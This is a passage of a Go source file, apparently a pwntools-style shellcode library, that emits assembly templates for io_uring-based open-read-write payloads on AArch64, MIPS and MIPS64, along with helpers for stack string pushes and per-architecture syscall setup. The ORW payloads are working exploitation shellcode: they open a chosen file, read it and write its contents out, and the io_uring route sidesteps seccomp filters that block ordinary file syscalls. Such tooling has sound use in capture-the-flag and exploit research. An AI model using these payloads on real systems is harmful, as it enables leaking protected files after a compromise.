		add x10, x21, x2
		ldr w3, [x10]
		ldr w2, [x19, #48]
		ldr w2, [x21, x2]
		and w0, w3, w2
		ldr w2, [x19, #64]
		add x11, x21, x2
		str w0, [x11, x0, lsl #2]
		add w3, w3, #1
		str w3, [x10]
		lsl x0, x0, #6
		add x0, x23, x0
		stp xzr, xzr, [x0, #0]
		stp xzr, xzr, [x0, #16]
		stp xzr, xzr, [x0, #32]
		stp xzr, xzr, [x0, #48]
		ret

	submit_and_wait:
		mov x0, x20
		mov x1, #1
		mov x2, #1
		mov x3, #%#x
		mov x4, xzr
		mov x5, xzr
		mov x8, #SYS_io_uring_enter
		svc #0
		tbnz x0, #63, fail
		ldr w2, [x19, #80]
		add x10, x22, x2
		ldr w3, [x10]
		ldr w2, [x19, #88]
		ldr w2, [x22, x2]
		and w0, w3, w2
		ldr w2, [x19, #100]
		add x11, x22, x2
		lsl x0, x0, #4
		add x11, x11, x0
		ldrsw x0, [x11, #8]
		add w3, w3, #1
		str w3, [x10]
		ret

	file_fd:
		.word 0
	read_len:
		.word 0
	fail_msg:
		.ascii "io_uring failed\n"
	fail_msg_end:
	path:
		.asciz %s
		.balign 8
	params:
		.zero 120
	buf:
		.zero %#x
	`,
		IORING_OFF_CQ_RING,
		IORING_OFF_SQES,
		IORING_OP_OPENAT,
		IORING_OP_READ,
		size,
		IORING_OP_WRITE,
		IORING_ENTER_GETEVENTS,
		strconv.Quote(path),
		size,
	)
}

func shellcraftIoUringORWMIPS(arch string, path string, size int) string {
	addrOff := 16
	userDataOff := 32
	if shellcraftEndian(arch) == "big" {
		addrOff += 4
		userDataOff += 4
	}

	return fmt.Sprintf(`
		move $s7, $ra
		bal base_anchor
		nop
	base_anchor:
		move $s0, $ra
		addiu $s6, $s0, params-base_anchor
		li $a0, 8
		move $a1, $s6
		li $v0, SYS_io_uring_setup
		syscall
		bnez $a3, fail
		nop
		move $s1, $v0

		lw $a1, 64($s6)
		lw $t0, 0($s6)
		sll $t0, $t0, 2
		addu $a1, $a1, $t0
		lw $t2, 100($s6)
		lw $t0, 4($s6)
		sll $t0, $t0, 4
		addu $t2, $t2, $t0
		lw $t0, 20($s6)
		andi $t0, $t0, %#x
		beqz $t0, mmap_sq_ring
		nop
		sltu $t3, $a1, $t2
		beqz $t3, mmap_sq_ring
		nop
		move $a1, $t2

	mmap_sq_ring:
		move $a0, $zero
		li $a2, 3
		li $a3, 0x8001
		addiu $sp, $sp, -32
		sw $s1, 16($sp)
		sw $zero, 20($sp)
		li $v0, SYS_mmap2
		syscall
		addiu $sp, $sp, 32
		bnez $a3, fail
		nop
		move $s2, $v0

		lw $t0, 20($s6)
		andi $t0, $t0, %#x
		beqz $t0, mmap_cq_ring
		nop
		move $s3, $s2
		b mmap_sqes
		nop

	mmap_cq_ring:
		move $a0, $zero
		lw $a1, 100($s6)
		lw $t0, 4($s6)
		sll $t0, $t0, 4
		addu $a1, $a1, $t0
		li $a2, 3
		li $a3, 0x8001
		addiu $sp, $sp, -32
		sw $s1, 16($sp)
		li $t0, %#x
		sw $t0, 20($sp)
		li $v0, SYS_mmap2
		syscall
		addiu $sp, $sp, 32
		bnez $a3, fail
		nop
		move $s3, $v0

	mmap_sqes:
		move $a0, $zero
		lw $a1, 0($s6)
		sll $a1, $a1, 6
		li $a2, 3
		li $a3, 0x8001
		addiu $sp, $sp, -32
		sw $s1, 16($sp)
		li $t0, %#x
		sw $t0, 20($sp)
		li $v0, SYS_mmap2
		syscall
		addiu $sp, $sp, 32
		bnez $a3, fail
		nop
		move $s4, $v0

		jal prepare_sqe
		nop
		li $t0, %#x
		sb $t0, 0($v0)
		li $t0, -100
		sw $t0, 4($v0)
		addiu $t0, $s0, path-base_anchor
		sw $t0, %d($v0)
		li $t0, 1
		sw $t0, %d($v0)
		jal submit_and_wait
		nop
		bltz $v0, fail
		nop
		sw $v0, 120($s6)

		jal prepare_sqe
		nop
		li $t0, %#x
		sb $t0, 0($v0)
		lw $t0, 120($s6)
		sw $t0, 4($v0)
		addiu $t0, $s0, buf-base_anchor
		sw $t0, %d($v0)
		li $t0, %#x
		sw $t0, 24($v0)
		li $t0, 2
		sw $t0, %d($v0)
		jal submit_and_wait
		nop
		bltz $v0, fail
		nop
		sw $v0, 124($s6)

		jal prepare_sqe
		nop
		li $t0, %#x
		sb $t0, 0($v0)
		li $t0, 1
		sw $t0, 4($v0)
		addiu $t0, $s0, buf-base_anchor
		sw $t0, %d($v0)
		lw $t0, 124($s6)
		sw $t0, 24($v0)
		li $t0, 3
		sw $t0, %d($v0)
		jal submit_and_wait
		nop
		jr $s7
		nop

	fail:
		li $a0, 1
		addiu $a1, $s0, fail_msg-base_anchor
		li $a2, fail_msg_end-fail_msg
		li $v0, SYS_write
		syscall
		li $v0, -1
		jr $s7
		nop

	prepare_sqe:
		lw $t0, 44($s6)
		addu $t1, $s2, $t0
		lw $t2, 0($t1)
		lw $t0, 48($s6)
		addu $t3, $s2, $t0
		lw $t3, 0($t3)
		and $v0, $t2, $t3
		lw $t0, 64($s6)
		addu $t4, $s2, $t0
		sll $t5, $v0, 2
		addu $t4, $t4, $t5
		sw $v0, 0($t4)
		addiu $t2, $t2, 1
		sw $t2, 0($t1)
		sll $t5, $v0, 6
		addu $v0, $s4, $t5
		sw $zero, 0($v0)
		sw $zero, 4($v0)
		sw $zero, 8($v0)
		sw $zero, 12($v0)
		sw $zero, 16($v0)
		sw $zero, 20($v0)
		sw $zero, 24($v0)
		sw $zero, 28($v0)
		sw $zero, 32($v0)
		sw $zero, 36($v0)
		sw $zero, 40($v0)
		sw $zero, 44($v0)
		sw $zero, 48($v0)
		sw $zero, 52($v0)
		sw $zero, 56($v0)
		sw $zero, 60($v0)
		jr $ra
		nop

	submit_and_wait:
		move $a0, $s1
		li $a1, 1
		li $a2, 1
		li $a3, %#x
		addiu $sp, $sp, -32
		sw $zero, 16($sp)
		sw $zero, 20($sp)
		li $v0, SYS_io_uring_enter
		syscall
		addiu $sp, $sp, 32
		bnez $a3, fail
		nop
		lw $t0, 80($s6)
		addu $t1, $s3, $t0
		lw $t2, 0($t1)
		lw $t0, 88($s6)
		addu $t3, $s3, $t0
		lw $t3, 0($t3)
		and $v0, $t2, $t3
		lw $t0, 100($s6)
		addu $t4, $s3, $t0
		sll $t5, $v0, 4
		addu $t4, $t4, $t5
		lw $v0, 8($t4)
		addiu $t2, $t2, 1
		sw $t2, 0($t1)
		jr $ra
		nop

	fail_msg:
		.ascii "io_uring failed\n"
	fail_msg_end:
	path:
		.asciz %s
		.balign 8
	params:
		.zero 120
	file_fd:
		.word 0
	read_len:
		.word 0
	buf:
		.zero %#x
	`,
		IORING_FEAT_SINGLE_MMAP,
		IORING_FEAT_SINGLE_MMAP,
		IORING_OFF_CQ_RING>>12,
		IORING_OFF_SQES>>12,
		IORING_OP_OPENAT,
		addrOff,
		userDataOff,
		IORING_OP_READ,
		addrOff,
		size,
		userDataOff,
		IORING_OP_WRITE,
		addrOff,
		userDataOff,
		IORING_ENTER_GETEVENTS,
		strconv.Quote(path),
		size,
	)
}

func shellcraftIoUringORWMIPS64(path string, size int) string {
	return fmt.Sprintf(`
		move $s7, $ra
		bal base_anchor
		nop
	base_anchor:
		move $s0, $ra
		daddiu $s6, $s0, params-base_anchor
		li $a0, 8
		move $a1, $s6
		li $v0, SYS_io_uring_setup
		syscall
		bnez $a3, fail
		nop
		move $s1, $v0

		lw $a1, 64($s6)
		lw $t0, 0($s6)
		dsll $t0, $t0, 2
		daddu $a1, $a1, $t0
		lw $t2, 100($s6)
		lw $t0, 4($s6)
		dsll $t0, $t0, 4
		daddu $t2, $t2, $t0
		lw $t0, 20($s6)
		andi $t0, $t0, %#x
		beqz $t0, mmap_sq_ring
		nop
		sltu $t3, $a1, $t2
		beqz $t3, mmap_sq_ring
		nop
		move $a1, $t2

	mmap_sq_ring:
		move $a0, $zero
		li $a2, 3
		li $a3, 0x8001
		move $a4, $s1
		move $a5, $zero
		li $v0, SYS_mmap
		syscall
		bnez $a3, fail
		nop
		move $s2, $v0

		lw $t0, 20($s6)
		andi $t0, $t0, %#x
		beqz $t0, mmap_cq_ring
		nop
		move $s3, $s2
		b mmap_sqes
		nop

	mmap_cq_ring:
		move $a0, $zero
		lw $a1, 100($s6)
		lw $t0, 4($s6)
		dsll $t0, $t0, 4
		daddu $a1, $a1, $t0
		li $a2, 3
		li $a3, 0x8001
		move $a4, $s1
		li $a5, %#x
		li $v0, SYS_mmap
		syscall
		bnez $a3, fail
		nop
		move $s3, $v0

	mmap_sqes:
		move $a0, $zero
		lw $a1, 0($s6)
		dsll $a1, $a1, 6
		li $a2, 3
		li $a3, 0x8001
		move $a4, $s1
		li $a5, %#x
		li $v0, SYS_mmap
		syscall
		bnez $a3, fail
		nop
		move $s4, $v0

		jal prepare_sqe
		nop
		li $t0, %#x
		sb $t0, 0($v0)
		li $t0, -100
		sw $t0, 4($v0)
		daddiu $t0, $s0, path-base_anchor
		sd $t0, 16($v0)
		li $t0, 1
		sd $t0, 32($v0)
		jal submit_and_wait
		nop
		bltz $v0, fail
		nop
		sw $v0, 120($s6)

		jal prepare_sqe
		nop
		li $t0, %#x
		sb $t0, 0($v0)
		lw $t0, 120($s6)
		sw $t0, 4($v0)
		daddiu $t0, $s0, buf-base_anchor
		sd $t0, 16($v0)
		li $t0, %#x
		sw $t0, 24($v0)
		li $t0, 2
		sd $t0, 32($v0)
		jal submit_and_wait
		nop
		bltz $v0, fail
		nop
		sw $v0, 124($s6)

		jal prepare_sqe
		nop
		li $t0, %#x
		sb $t0, 0($v0)
		li $t0, 1
		sw $t0, 4($v0)
		daddiu $t0, $s0, buf-base_anchor
		sd $t0, 16($v0)
		lw $t0, 124($s6)
		sw $t0, 24($v0)
		li $t0, 3
		sd $t0, 32($v0)
		jal submit_and_wait
		nop
		jr $s7
		nop

	fail:
		li $a0, 1
		daddiu $a1, $s0, fail_msg-base_anchor
		li $a2, fail_msg_end-fail_msg
		li $v0, SYS_write
		syscall
		li $v0, -1
		jr $s7
		nop

	prepare_sqe:
		lw $t0, 44($s6)
		daddu $t1, $s2, $t0
		lw $t2, 0($t1)
		lw $t0, 48($s6)
		daddu $t3, $s2, $t0
		lw $t3, 0($t3)
		and $v0, $t2, $t3
		lw $t0, 64($s6)
		daddu $t8, $s2, $t0
		dsll $t9, $v0, 2
		daddu $t8, $t8, $t9
		sw $v0, 0($t8)
		addiu $t2, $t2, 1
		sw $t2, 0($t1)
		dsll $t9, $v0, 6
		daddu $v0, $s4, $t9
		sd $zero, 0($v0)
		sd $zero, 8($v0)
		sd $zero, 16($v0)
		sd $zero, 24($v0)
		sd $zero, 32($v0)
		sd $zero, 40($v0)
		sd $zero, 48($v0)
		sd $zero, 56($v0)
		jr $ra
		nop

	submit_and_wait:
		move $a0, $s1
		li $a1, 1
		li $a2, 1
		li $a3, %#x
		move $a4, $zero
		move $a5, $zero
		li $v0, SYS_io_uring_enter
		syscall
		bnez $a3, fail
		nop
		lw $t0, 80($s6)
		daddu $t1, $s3, $t0
		lw $t2, 0($t1)
		lw $t0, 88($s6)
		daddu $t3, $s3, $t0
		lw $t3, 0($t3)
		and $v0, $t2, $t3
		lw $t0, 100($s6)
		daddu $t8, $s3, $t0
		dsll $t9, $v0, 4
		daddu $t8, $t8, $t9
		lw $v0, 8($t8)
		addiu $t2, $t2, 1
		sw $t2, 0($t1)
		jr $ra
		nop

	fail_msg:
		.ascii "io_uring failed\n"
	fail_msg_end:
	path:
		.asciz %s
		.balign 8
	params:
		.zero 120
	file_fd:
		.word 0
	read_len:
		.word 0
	buf:
		.zero %#x
	`,
		IORING_FEAT_SINGLE_MMAP,
		IORING_FEAT_SINGLE_MMAP,
		IORING_OFF_CQ_RING,
		IORING_OFF_SQES,
		IORING_OP_OPENAT,
		IORING_OP_READ,
		size,
		IORING_OP_WRITE,
		IORING_ENTER_GETEVENTS,
		strconv.Quote(path),
		size,
	)
}

func shellcraftPushString(arch string, value string) (string, error) {
	data := []byte(value)
	if len(data) == 0 || data[len(data)-1] != 0 {
		data = append(data, 0)
	}
	if len(data) > math.MaxInt32 {
		return "", fmt.Errorf("shellcraft string is too large: %d bytes", len(data))
	}

	sp := shellcraftStackPointer(arch)
	if sp == "" {
		return "", fmt.Errorf("unsupported shellcraft arch %q", arch)
	}

	alloc := len(data)
	if canonicalAsmSyscallArch(arch) == "aarch64" {
		alloc = alignUp(alloc, 16)
	}

	var b strings.Builder
	shellcraftStackAlloc(&b, arch, sp, alloc)
	for offset := 0; offset < len(data); {
		remaining := len(data) - offset
		width := shellcraftStringChunkWidth(arch, remaining)
		imm := shellcraftChunkImmediate(arch, data[offset:offset+width])
		if err := shellcraftStoreStringChunk(&b, arch, sp, offset, width, imm); err != nil {
			return "", err
		}
		offset += width
	}
	return b.String(), nil
}

func shellcraftSyscallNumber(arch string, number uint64, args ...any) (string, error) {
	abi, ok := shellcraftSyscallABI(arch)
	if !ok {
		return "", fmt.Errorf("unsupported shellcraft arch %q", arch)
	}
	regArgCount := len(args)
	if regArgCount > len(abi.argRegs) {
		regArgCount = len(abi.argRegs)
	}
	extraArgs := args[regArgCount:]
	if len(extraArgs) > 0 && abi.stackArgSize == 0 {
		return "", fmt.Errorf("too many syscall arguments: got %d, max %d", len(args), len(abi.argRegs))
	}
	if len(extraArgs) > 2 {
		return "", fmt.Errorf("too many syscall stack arguments: got %d, max 2", len(extraArgs))
	}

	var b strings.Builder
	if len(extraArgs) > 0 {
		shellcraftStackAlloc(&b, arch, abi.stackReg, abi.stackArgOffset+len(extraArgs)*abi.stackArgSize)
		for i, arg := range extraArgs {
			if err := shellcraftStoreStackArgument(&b, arch, abi.stackReg, abi.stackArgOffset+i*abi.stackArgSize, arg); err != nil {
				return "", err
			}
		}
	}
	for i, arg := range args[:regArgCount] {
		line, err := shellcraftMove(arch, abi.argRegs[i], arg)
		if err != nil {
			return "", err
		}
		b.WriteString(line)
	}
	line, err := shellcraftMove(arch, abi.syscallReg, number)
	if err != nil {
		return "", err
	}
	b.WriteString(line)
	shellcraftLine(&b, "%s", abi.syscallInsn)
	return b.String(), nil
}

type shellcraftABI struct {
	argRegs        []string
	syscallReg     string
	returnReg      string
	stackReg       string
	syscallInsn    string
	stackArgOffset int
	stackArgSize   int
}

func shellcraftSyscallABI(arch string) (shellcraftABI, bool) {
	switch canonicalAsmSyscallArch(arch) {
	case "amd64":
		return shellcraftABI{
			argRegs:     []string{"rdi", "rsi", "rdx", "r10", "r8", "r9"},
			syscallReg:  "rax",
			returnReg:   "rax",
			stackReg:    "rsp",
			syscallInsn: "syscall",
		}, true
	case "i386":
		return shellcraftABI{
			argRegs:     []string{"ebx", "ecx", "edx", "esi", "edi", "ebp"},
			syscallReg:  "eax",
			returnReg:   "eax",
			stackReg:    "esp",
			syscallInsn: "int 0x80",
		}, true
	case "arm":
		return shellcraftABI{
			argRegs:     []string{"r0", "r1", "r2", "r3", "r4", "r5", "r6"},
			syscallReg:  "r7",
			returnReg:   "r0",
			stackReg:    "sp",
			syscallInsn: "svc 0",
		}, true
	case "aarch64":
		return shellcraftABI{
			argRegs:     []string{"x0", "x1", "x2", "x3", "x4", "x5"},
			syscallReg:  "x8",
			returnReg:   "x0",
			stackReg:    "sp",
			syscallInsn: "svc #0",
		}, true
	case "mips":
		return shellcraftABI{
			argRegs:        []string{"$a0", "$a1", "$a2", "$a3"},
			syscallReg:     "$v0",
			returnReg:      "$v0",
			stackReg:       "$sp",
			syscallInsn:    "syscall",
			stackArgOffset: 16,
			stackArgSize:   4,
		}, true
	case "mips64":
		return shellcraftABI{
			argRegs:     []string{"$a0", "$a1", "$a2", "$a3", "$a4", "$a5"},
			syscallReg:  "$v0",
			returnReg:   "$v0",
			stackReg:    "$sp",
			syscallInsn: "syscall",
		}, true
	default:
		return shellcraftABI{}, false
	}
}

func shellcraftMove(arch string, dst string, value any) (string, error) {
	dst = shellcraftCanonicalRegister(dst, arch)
	if dst == "" {
		return "", fmt.Errorf("unsupported shellcraft destination register %q for arch %q", dst, arch)
	}
	switch v := value.(type) {
	case nil:
		return shellcraftMoveImmediate(arch, dst, 0), nil
	case string:
		expr := strings.TrimSpace(v)
		if expr == "" {
			return "", fmt.Errorf("empty shellcraft expression")
		}
		if expr == "0" {
			return shellcraftMoveImmediate(arch, dst, 0), nil
		}
		if reg := shellcraftCanonicalRegister(expr, arch); reg != "" {
			if reg == dst {
				return "", nil
			}
			return shellcraftMoveRegister(arch, dst, reg), nil
		}
		return shellcraftMoveExpression(arch, dst, expr), nil
	case int:
		return shellcraftMoveSignedImmediate(arch, dst, int64(v)), nil
	case int8:
		return shellcraftMoveSignedImmediate(arch, dst, int64(v)), nil
	case int16:
		return shellcraftMoveSignedImmediate(arch, dst, int64(v)), nil
	case int32:
		return shellcraftMoveSignedImmediate(arch, dst, int64(v)), nil
	case int64:
		return shellcraftMoveSignedImmediate(arch, dst, v), nil
	case uint:
		return shellcraftMoveImmediate(arch, dst, uint64(v)), nil
	case uint8:
		return shellcraftMoveImmediate(arch, dst, uint64(v)), nil
	case uint16:
		return shellcraftMoveImmediate(arch, dst, uint64(v)), nil
	case uint32:
		return shellcraftMoveImmediate(arch, dst, uint64(v)), nil
	case uint64:
		return shellcraftMoveImmediate(arch, dst, v), nil
	default:
		return "", fmt.Errorf("unsupported shellcraft argument %T", value)
	}
}

func shellcraftStackPointer(arch string) string {
	abi, ok := shellcraftSyscallABI(arch)
	if !ok {
		return ""
	}
	return abi.stackReg
}

func shellcraftReturnRegister(arch string) string {
	abi, ok := shellcraftSyscallABI(arch)
	if !ok {
		return ""
	}
	return abi.returnReg
}

func shellcraftIsRegister(value string, arch string) bool {
	return shellcraftCanonicalRegister(value, arch) != ""
}

func shellcraftCanonicalRegister(value string, arch string) string {
	value = strings.ToLower(strings.TrimSpace(value))
	if value == "" {
		return ""
	}
	switch canonicalAsmSyscallArch(arch) {
	case "amd64":
		switch value {
		case "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rsp", "rbp",
			"r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15":
			return value
		}
	case "i386":
		switch value {
		case "eax", "ebx", "ecx", "edx", "esi", "edi", "esp", "ebp":
			return value
		}
	case "arm":
		switch value {
		case "r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11", "r12", "sp", "lr", "pc":
			return value
		}
	case "aarch64":
		if value == "sp" || value == "xzr" || value == "wzr" {
			return value
		}
		if strings.HasPrefix(value, "x") || strings.HasPrefix(value, "w") {
			n, ok := parseSmallRegisterNumber(value[1:])
			if ok && n <= 30 {
				return value
			}
		}
	case "mips", "mips64":
		value = strings.TrimPrefix(value, "$")
		switch value {
		case "zero", "at", "v0", "v1", "a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7",
			"t0", "t1", "t2", "t3", "t4", "t5", "t6", "t7", "t8", "t9",
			"s0", "s1", "s2", "s3", "s4", "s5", "s6", "s7", "s8", "k0", "k1", "gp", "sp", "fp", "ra":
			return "$" + value
		}
	}
	return ""
}

func shellcraftMoveSignedImmediate(arch string, dst string, value int64) string {
	if value < 0 {
		switch canonicalAsmSyscallArch(arch) {
		case "arm":
			return shellcraftMoveImmediate(arch, dst, uint64(uint32(value)))
		case "aarch64":
			return shellcraftMoveImmediate(arch, dst, uint64(value))
		default:
			return shellcraftMoveExpression(arch, dst, fmt.Sprintf("%d", value))
		}
	}
	return shellcraftMoveImmediate(arch, dst, uint64(value))
}

func shellcraftMoveImmediate(arch string, dst string, value uint64) string {
	var b strings.Builder
	if value == 0 {
		switch canonicalAsmSyscallArch(arch) {
		case "amd64", "i386":
			shellcraftLine(&b, "xor %s, %s", dst, dst)
		case "mips", "mips64":
			shellcraftLine(&b, "move %s, $zero", dst)
		default:
			shellcraftLine(&b, "mov %s, #0", dst)
		}
		return b.String()
	}

	switch canonicalAsmSyscallArch(arch) {
	case "arm":
		shellcraftLoadARMImmediate(&b, dst, uint32(value))
	case "aarch64":
		shellcraftLoadAArch64Immediate(&b, dst, value)
	case "mips", "mips64":
		shellcraftLine(&b, "li %s, %#x", dst, value)
	default:
		shellcraftLine(&b, "mov %s, %#x", dst, value)
	}
	return b.String()
}

func shellcraftMoveRegister(arch string, dst string, src string) string {
	var b strings.Builder
	switch canonicalAsmSyscallArch(arch) {
	case "mips", "mips64":
		shellcraftLine(&b, "move %s, %s", dst, src)
	default:
		shellcraftLine(&b, "mov %s, %s", dst, src)
	}
	return b.String()
}

func shellcraftMoveExpression(arch string, dst string, expr string) string {
	var b strings.Builder
	switch canonicalAsmSyscallArch(arch) {
	case "mips", "mips64":
		shellcraftLine(&b, "li %s, %s", dst, expr)
	default:
		shellcraftLine(&b, "mov %s, %s", dst, expr)
	}
	return b.String()
}

func shellcraftLoadARMImmediate(b *strings.Builder, dst string, value uint32) {
	shellcraftLine(b, "movw %s, #%#x", dst, value&0xffff)
	if high := value >> 16; high != 0 {
		shellcraftLine(b, "movt %s, #%#x", dst, high)
	}
}

func shellcraftLoadAArch64Immediate(b *strings.Builder, dst string, value uint64) {
	shellcraftLine(b, "movz %s, #%#x", dst, value&0xffff)
	for shift := uint(16); shift <= 48; shift += 16 {
		if part := (value >> shift) & 0xffff; part != 0 {
			shellcraftLine(b, "movk %s, #%#x, lsl #%d", dst, part, shift)
		}
	}
}

func shellcraftStackAlloc(b *strings.Builder, arch string, sp string, size int) {
	switch canonicalAsmSyscallArch(arch) {
	case "arm", "aarch64":
		shellcraftLine(b, "sub %s, %s, #%#x", sp, sp, size)
	case "mips":
		shellcraftLine(b, "addiu %s, %s, -%d", sp, sp, size)
	case "mips64":
		shellcraftLine(b, "daddiu %s, %s, -%d", sp, sp, size)
	default:
		shellcraftLine(b, "sub %s, %#x", sp, size)
	}
}

func shellcraftStringChunkWidth(arch string, remaining int) int {
	switch canonicalAsmSyscallArch(arch) {
	case "amd64", "aarch64", "mips64":
		if remaining >= 8 {
			return 8
		}
	}
	if remaining >= 4 {
		return 4
	}
	if remaining >= 2 {
		return 2
	}
	return 1
}

func shellcraftChunkImmediate(arch string, data []byte) uint64 {
	buf := make([]byte, 8)
	if shellcraftEndian(arch) == "big" {
		copy(buf[8-len(data):], data)
		return binary.BigEndian.Uint64(buf)
	}
	copy(buf, data)
	return binary.LittleEndian.Uint64(buf)
}

func shellcraftStoreStringChunk(b *strings.Builder, arch string, sp string, offset int, width int, imm uint64) error {
	switch canonicalAsmSyscallArch(arch) {
	case "amd64":
		switch width {
		case 8:
			shellcraftLine(b, "mov rax, %#x", imm)
			shellcraftLine(b, "mov qword ptr [%s%s], rax", sp, shellcraftOffset(offset))
		case 4:
			shellcraftLine(b, "mov dword ptr [%s%s], %#x", sp, shellcraftOffset(offset), imm)
		case 2:
			shellcraftLine(b, "mov word ptr [%s%s], %#x", sp, shellcraftOffset(offset), imm)
		case 1:
			shellcraftLine(b, "mov byte ptr [%s%s], %#x", sp, shellcraftOffset(offset), imm)
		}
	case "i386":
		switch width {
		case 4:
			shellcraftLine(b, "mov dword ptr [%s%s], %#x", sp, shellcraftOffset(offset), imm)
		case 2:
			shellcraftLine(b, "mov word ptr [%s%s], %#x", sp, shellcraftOffset(offset), imm)
		case 1:
			shellcraftLine(b, "mov byte ptr [%s%s], %#x", sp, shellcraftOffset(offset), imm)
		}
	case "arm":
		shellcraftLoadARMImmediate(b, "r12", uint32(imm))
		switch width {
		case 4:
			shellcraftLine(b, "str r12, %s", shellcraftARMAddress(sp, offset))
		case 2:
			shellcraftLine(b, "strh r12, %s", shellcraftARMAddress(sp, offset))
		case 1:
			shellcraftLine(b, "strb r12, %s", shellcraftARMAddress(sp, offset))
		}
	case "aarch64":
		switch width {
		case 8:
			shellcraftLoadAArch64Immediate(b, "x9", imm)
			shellcraftLine(b, "str x9, %s", shellcraftARMAddress(sp, offset))
		case 4:
			shellcraftLoadAArch64Immediate(b, "x9", imm)
			shellcraftLine(b, "str w9, %s", shellcraftARMAddress(sp, offset))
		case 2:
			shellcraftLoadAArch64Immediate(b, "x9", imm)
			shellcraftLine(b, "strh w9, %s", shellcraftARMAddress(sp, offset))
		case 1:
			shellcraftLoadAArch64Immediate(b, "x9", imm)
			shellcraftLine(b, "strb w9, %s", shellcraftARMAddress(sp, offset))
		}
	case "mips":
		shellcraftLine(b, "li $t9, %#x", imm)
		switch width {
		case 4:
			shellcraftLine(b, "sw $t9, %s", shellcraftMIPSAddress(sp, offset))
		case 2:
			shellcraftLine(b, "sh $t9, %s", shellcraftMIPSAddress(sp, offset))
		case 1:
			shellcraftLine(b, "sb $t9, %s", shellcraftMIPSAddress(sp, offset))
		}
	case "mips64":
		if width == 8 {
			shellcraftLine(b, "dli $t9, %#x", imm)
			shellcraftLine(b, "sd $t9, %s", shellcraftMIPSAddress(sp, offset))
			return nil
		}
		shellcraftLine(b, "li $t9, %#x", imm)
		switch width {
		case 4:
			shellcraftLine(b, "sw $t9, %s", shellcraftMIPSAddress(sp, offset))
		case 2:
			shellcraftLine(b, "sh $t9, %s", shellcraftMIPSAddress(sp, offset))
		case 1:
			shellcraftLine(b, "sb $t9, %s", shellcraftMIPSAddress(sp, offset))
		}
	default:
		return fmt.Errorf("unsupported shellcraft arch %q", arch)
	}
	return nil
}

func shellcraftStoreStackArgument(b *strings.Builder, arch string, sp string, offset int, value any) error {
	switch canonicalAsmSyscallArch(arch) {
	case "mips":
		line, err := shellcraftMove(arch, "$t9", value)
		if err != nil {
			return err
		}
		b.WriteString(line)
		shellcraftLine(b, "sw $t9, %s", shellcraftMIPSAddress(sp, offset))
		return nil
	default:
		return fmt.Errorf("unsupported stack syscall arguments for arch %q", arch)
	}
}

func shellcraftARMAddress(base string, offset int) string {
	if offset == 0 {
		return fmt.Sprintf("[%s]", base)
	}
	return fmt.Sprintf("[%s, #%#x]", base, offset)
}

func shellcraftMIPSAddress(base string, offset int) string {
	return fmt.Sprintf("%d(%s)", offset, base)
}

func shellcraftEndian(arch string) string {
	switch strings.ToLower(strings.TrimSpace(arch)) {
	case "mips", "mips64":
		return "big"
	default:
		return "little"
	}
}

func parseSmallRegisterNumber(value string) (int, bool) {
	if value == "" {
		return 0, false
	}
	n := 0
	for _, ch := range value {
		if ch < '0' || ch > '9' {
			return 0, false
		}
		n = n*10 + int(ch-'0')
	}
	return n, true
}

func alignUp(n int, alignment int) int {
	if alignment <= 0 {
		return n
	}
	remainder := n % alignment
	if remainder == 0 {
		return n
	}
	return n + alignment - remainder
}

func shellcraftOffset(offset int) string {
	if offset == 0 {
		return ""
	}
	return fmt.Sprintf("+%#x", offset)
}

func shellcraftLine(b *strings.Builder, format string, args ...any) {
	b.WriteString("    ")
	fmt.Fprintf(b, format, args...)
	b.WriteByte('\n')
}

func optionalShellcraftArgs(name string, args []any, defaults ...any) (any, any) {
	if len(args) > len(defaults) {
		panic(fmt.Sprintf("shellcraft %s takes at most %d optional arguments, got %d", name, len(defaults), len(args)))
	}
	values := append([]any{}, defaults...)
	copy(values, args)
	return values[0], values[1]
}

func mustShellcraft(code string, err error) string {
	if err != nil {
		panic(err)
	}
	return code
}
